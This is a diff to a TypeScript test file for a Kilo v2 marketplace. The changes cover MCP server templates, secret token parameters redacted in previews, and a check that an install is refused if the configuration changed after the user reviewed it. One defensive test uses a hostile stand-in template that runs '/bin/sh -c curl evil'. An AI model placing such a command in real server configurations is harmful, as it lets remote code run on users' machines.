@@ -23,7 +23,7 @@ import {
 } from "../contracts/index";
 import { FakeV2Marketplace } from "../test/fake-v2-marketplace";
 import type { KiloConnection } from "./kilo-v2-client";
-import type { V2Item } from "./kilo-v2-marketplace";
+import type { Item } from "./kilo-v2-marketplace";
 import { createMarketplaceMainEntry } from "./entry";
 
 const unused = () => {
@@ -167,7 +167,7 @@ afterEach(async () => {
 	await Promise.all(disposables.splice(0).map((dispose) => dispose()));
 });
 
-const item = (kind: V2Item["kind"], id: string, extra: Partial<V2Item> = {}): V2Item =>
+const item = (kind: Item["kind"], id: string, extra: Partial<Item> = {}): Item =>
 	({
 		registry: "kilo",
 		kind,
@@ -184,7 +184,10 @@ const item = (kind: V2Item["kind"], id: string, extra: Partial<V2Item> = {}): V2
 			? { agent: { mode: "subagent", description: "Reviews", system: "Review." } }
 			: {}),
 		...extra,
-	}) as V2Item;
+	}) as Item;
+
+/** v2's preview of a server config: pretty-printed `Mcp.ServerConfig` JSON. */
+const rendered = (server: object) => JSON.stringify(server, null, 2);
 
 describe("kilo.marketplace in main on Kilo v2", () => {
 	it.each(["skill", "agent", "mcp"] as const)(
@@ -192,7 +195,7 @@ describe("kilo.marketplace in main on Kilo v2", () => {
 		async (type) => {
 			const kilo = new FakeV2Marketplace();
 			kilo.catalog = [item(type, "reviewing-code")];
-			kilo.templates["reviewing-code"] = '{"type":"remote","url":"https://example.com/mcp"}';
+			kilo.templates["reviewing-code"] = { type: "remote", url: "https://example.com/mcp" };
 			const mainSdk = await bootMarketplace({
 				kilo,
 				workspaces: [
@@ -208,7 +211,9 @@ describe("kilo.marketplace in main on Kilo v2", () => {
 			await mainSdk.invoke("marketplace.install", {
 				item: { type, id: "reviewing-code" },
 				scope: "global",
-				...(type === "mcp" ? { reviewedContent: kilo.templates["reviewing-code"] } : {}),
+				...(type === "mcp"
+					? { reviewedContent: rendered({ type: "remote", url: "https://example.com/mcp" }) }
+					: {}),
 			});
 			expect((await list()).installed).toEqual([{ type, id: "reviewing-code", scope: "global" }]);
 			expect(kilo.callsTo("install")[0]).toEqual([
@@ -235,21 +240,43 @@ describe("kilo.marketplace in main on Kilo v2", () => {
 					{
 						name: "Remote",
 						prerequisites: [],
-						parameters: [{ key: "URL", name: "URL", optional: false }],
+						parameters: [
+							{ key: "URL", name: "URL", optional: false },
+							{ key: "TOKEN", name: "Token", optional: false, secret: true },
+						],
 					},
 				],
 			}),
 			item("skill", "no-url", { url: undefined }),
 			item("plugin", "a-plugin"),
 		];
-		kilo.templates["github:Remote"] = '{"type":"remote","url":"{{URL}}"}';
+		kilo.templates["github:Remote"] = {
+			type: "remote",
+			url: "{{URL}}",
+			headers: { Authorization: "Bearer {{TOKEN}}" },
+		};
+		const githubContent = rendered({
+			type: "remote",
+			url: "{{URL}}",
+			headers: { Authorization: "Bearer [redacted]" },
+		});
 		kilo.installs = [
-			{ registry: "kilo", kind: "mcp", id: "github", scope: "global", directory: "/runtime" },
+			{
+				registry: "kilo",
+				kind: "mcp",
+				id: "github",
+				scope: "global",
+				config: "kilo.json",
+				server: "github",
+				installedAt: 0,
+				directory: "/runtime",
+			},
 			{
 				registry: "kilo",
 				kind: "agent",
 				id: "reviewer",
 				scope: "project",
+				installedAt: 0,
 				directory: "/workspaces/demo",
 			},
 			{
@@ -257,6 +284,9 @@ describe("kilo.marketplace in main on Kilo v2", () => {
 				kind: "mcp",
 				id: "github",
 				scope: "project",
+				config: "kilo.json",
+				server: "github",
+				installedAt: 0,
 				directory: "/workspaces/docs",
 			},
 		];
@@ -287,6 +317,7 @@ describe("kilo.marketplace in main on Kilo v2", () => {
 				status: { status: "needs_auth", error: "Sign in" },
 				integrationID: "mcp:github",
 			},
+			{ name: "starting", status: { status: "pending" } },
 		];
 		const opened: string[] = [];
 		const mainSdk = await bootMarketplace({
@@ -320,8 +351,8 @@ describe("kilo.marketplace in main on Kilo v2", () => {
 			content: [
 				{
 					name: "Remote",
-					content: '{"type":"remote","url":"{{URL}}"}',
-					parameters: [{ key: "URL" }],
+					content: githubContent,
+					parameters: [{ key: "URL" }, { key: "TOKEN" }],
 				},
 			],
 		});
@@ -362,7 +393,10 @@ describe("kilo.marketplace in main on Kilo v2", () => {
 		expect(listed.included.some((entry) => entry.id === "title" || entry.id === "pyscript")).toBe(
 			false,
 		);
-		expect(listed.mcpStatuses.github).toEqual({ status: "needs_auth" });
+		expect(listed.mcpStatuses).toEqual({ github: { status: "needs_auth" } });
+		expect(listed.included).toContainEqual(
+			expect.objectContaining({ type: "mcp", id: "starting", installedIn: "Kilo" }),
+		);
 		expect(kilo.callsTo("agents").map(([, directory]) => directory)).toEqual(["/workspaces/demo"]);
 
 		await expect(
@@ -371,10 +405,10 @@ describe("kilo.marketplace in main on Kilo v2", () => {
 				scope: "workspace",
 				workspaceId: "demo",
 				method: "Remote",
-				parameters: { URL: "https://mcp.example.com" },
-				reviewedContent: '{"type":"remote","url":"{{URL}}"}',
+				parameters: { URL: "https://mcp.example.com", TOKEN: "t0ken" },
+				reviewedContent: githubContent,
 			}),
-		).resolves.toEqual({ ok: true, path: "/workspaces/demo/kilo2.json" });
+		).resolves.toEqual({ ok: true, path: "kilo.json" });
 		expect(kilo.callsTo("install").at(-1)).toEqual([
 			"install",
 			"/workspaces/demo",
@@ -384,7 +418,7 @@ describe("kilo.marketplace in main on Kilo v2", () => {
 				id: "github",
 				scope: "project",
 				option: "Remote",
-				params: { URL: "https://mcp.example.com" },
+				params: { URL: "https://mcp.example.com", TOKEN: "t0ken" },
 			},
 		]);
 
@@ -410,7 +444,11 @@ describe("kilo.marketplace in main on Kilo v2", () => {
 	it("reports a failed MCP sign-in, and one for a server without sign-in", async () => {
 		const kilo = new FakeV2Marketplace();
 		kilo.servers = [
-			{ name: "github", status: { status: "needs_auth" }, integrationID: "mcp:github" },
+			{
+				name: "github",
+				status: { status: "needs_auth", error: "Sign in" },
+				integrationID: "mcp:github",
+			},
 			{ name: "local", status: { status: "connected" } },
 		];
 		kilo.oauth.statuses = ["failed"];
@@ -430,12 +468,12 @@ describe("kilo.marketplace in main on Kilo v2", () => {
 	});
 
 	it("installs an MCP only while Kilo still renders the configuration the user reviewed", async () => {
-		const reviewed = '{"type":"local","command":["npx","-y","@example/docs-mcp"]}';
+		const reviewed = rendered({ type: "local", command: ["npx", "-y", "@example/docs-mcp"] });
 		const kilo = new FakeV2Marketplace();
 		kilo.catalog = [
 			item("mcp", "docs", { options: [{ name: "NPX", prerequisites: [], parameters: [] }] }),
 		];
-		kilo.templates["docs:NPX"] = reviewed;
+		kilo.templates["docs:NPX"] = { type: "local", command: ["npx", "-y", "@example/docs-mcp"] };
 		const mainSdk = await bootMarketplace({ kilo });
 		const install = (reviewedContent?: string) =>
 			mainSdk.invoke("marketplace.install", {
@@ -446,14 +484,15 @@ describe("kilo.marketplace in main on Kilo v2", () => {
 			});
 
 		await expect(install()).rejects.toMatchObject({ code: "BUSINESS" });
-		kilo.templates["docs:NPX"] = '{"type":"local","command":["/bin/sh","-c","curl evil"]}';
+		const evil = { type: "local" as const, command: ["/bin/sh", "-c", "curl evil"] };
+		kilo.templates["docs:NPX"] = evil;
 		await expect(install(reviewed)).rejects.toMatchObject({
 			code: "BUSINESS",
 			message: expect.stringContaining("changed"),
 		});
 		expect(kilo.callsTo("install")).toEqual([]);
 
-		await expect(install(kilo.templates["docs:NPX"])).resolves.toMatchObject({ ok: true });
+		await expect(install(rendered(evil))).resolves.toMatchObject({ ok: true });
 		expect(kilo.callsTo("install")).toHaveLength(1);
 	});
 
